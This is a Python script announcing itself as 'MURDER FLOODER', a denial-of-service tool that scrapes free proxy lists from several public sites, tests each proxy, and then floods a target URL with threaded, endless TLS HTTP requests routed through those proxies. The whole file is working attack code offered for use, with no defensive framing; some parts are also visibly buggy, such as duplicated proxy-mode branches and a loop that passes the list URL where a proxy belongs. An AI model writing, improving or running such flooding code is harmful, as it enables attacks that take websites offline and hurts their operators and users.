import ssl,threading,struct,sys,socks,socket,requests,re,base64
from MODEL.data import get_target,generate_url_path
urls = ["https://advanced.name/freeproxy","http://free-proxy-list.net/","https://www.us-proxy.org/","https://www.ditatompel.com/proxy/anonymity/elite"]

def proxyget2(url): 
	try:
		sourcecode = requests.get(url)
		part = str(sourcecode.content.decode())   
		part = part.split("<tbody>")          
		part = part[1].split("</tbody>")      
		part = part[0].split("<tr><td>")   
		proxies = []
		for proxy in part:
			proxy = proxy.split("</td><td>")
			try:
				if 'www.ditatompel.com' in url:
					p = proxy[0].replace('<span class="text-indigo-800 dark:text-indigo-400">','').replace('</span>','').replace('</strong>','<strong>').split('<strong>')[1]
					if p not in proxies:proxies.append(p)
				elif 'advanced.name' in url:
					ip = ''
					for a in re.findall('<td (?:data-port|data-ip)=\"(.*)\"><\/td>',proxy[0]):
						try:
							if int(base64.b64decode(a).decode()):ip+=base64.b64decode(a).decode()
							if ip not in proxies:proxies.append(ip)
							ip = ''
						except:ip += base64.b64decode(a).decode()+':'
				else:
					if proxy[0] + ":" + proxy[1] not in proxies:proxies.append(proxy[0] + ":" + proxy[1])
			except:
				pass
		return proxies
	except:pass

def proxyget(url): 
	try:
		ip = []
		sourcecode = requests.get(url)
		for line in sourcecode :
				ip = re.findall("(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3}):(?:[\d]{1,5})", str(line))
				ipf = list(filter(lambda x: x if not x.startswith("0.") else None, ip))
				if ipf:
					for x in ipf:
						if x not in ip:ip.append(x)
		return ip
	except:pass

def Murder_flooding(s,r):
    stream = 255
    while True:
     try:
        s.sendall(r[0])
        s.sendall(r[1])
        if stream == 0:s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0)); stream = 255
        else:stream -= 1
     except:break
    s.shutdown(socket.SHUT_RDWR)
    s.close()

def Murder_connection(ip,mode,target,m,path=1):
 try:
  s = socks.socksocket()
  if mode == 1:s.set_proxy(socks.SOCKS4,str(ip[0]),int(ip[1]))
  elif mode == 1:s.set_proxy(socks.SOCKS4,str(ip[0]),int(ip[1]))
  elif mode == 1:s.set_proxy(socks.SOCKS4,str(ip[0]),int(ip[1]))
  s.setblocking(1); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1); s.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, 255); s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1); s.setsockopt(socket.IPPROTO_TCP, socket.TCP_FASTOPEN, 1)
  s.connect((target['host'],int(target['port']))); s.connect_ex((target['host'],int(target['port'])))
  a = ssl.SSLContext(ssl.PROTOCOL_TLS,ssl.PROTOCOL_TLS_CLIENT,ssl.PROTOCOL_TLS_SERVER,ssl.PROTOCOL_TLSv1,ssl.PROTOCOL_TLSv1_1,ssl.PROTOCOL_TLSv1_2,ssl.PROTOCOL_SSLv23)
  a.options = ssl.OP_NO_RENEGOTIATION
  a.set_ciphers('AES256-SHA256:AES128-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DES-CBC3-SHA:AES128-SHA256:ECDHE-RSA-AES256-GCM-SHA384:AES256-SHA:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES128-SHA256:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA')
  threading.Thread(target=Murder_flooding,args=(a.wrap_socket(s,server_hostname=target['host']),[f"{m} {a} HTTP/1.1\r\nHost: {target['host']}\r\nCache-Control: no-cache\r\npragma: no-cache\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36 PTST/190628.140653\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nSec-Fetch-Site: same-origin\r\nSec-GPC: 1\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Dest: document\r\nUpgrade-Insecure-Requests: 1\r\nTe: trailers\r\nConnection: Keep-Alive\r\n\r\n".encode() for a in [f'/{generate_url_path(num=path)}',target['uri']]])).start()
 except:pass

url = '';meth = ''; thread = 0

if len(sys.argv) == 4:
   url,time, meth = sys.argv[1], int(sys.argv[2]), sys.argv[3]
else:
 print(f'WELCOME TO MURDER FLOODER\n{sys.argv[0]} <URL> <TIME> <METHODS>')
target = get_target(url)
def checking(ip,target,m,path=1):
	try_e = 0
	while True:
		if try_e > 3:break
		proxy = ip.split(':')
		try:
			s = socks.socksocket()
			if try_e == 1:s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			elif try_e == 2:s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
			elif try_e == 3:s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
			s.settimeout(10)
			s.connect(("1.1.1.1", 80))
			sent = s.send(str.encode("GET / HTTP/1.1\r\n\r\n"))
			if not sent:try_e += 1
			else:threading.Thread(target=Murder_connection,args=(proxy,try_e,target,m,path)).start()
			s.close()
		except:try_e += 1
d = proxyget('https://www.my-proxy.com/free-elite-proxy.html')
if d:
 path = 1
 for a in d:threading.Thread(target=checking,args=(a,target,meth,)).start(); path+=1
for a in urls:
	c = proxyget2(a)
	if c:
		path = 1
		for b in c:threading.Thread(target=checking,args=(a,target,meth,)).start(); path+=1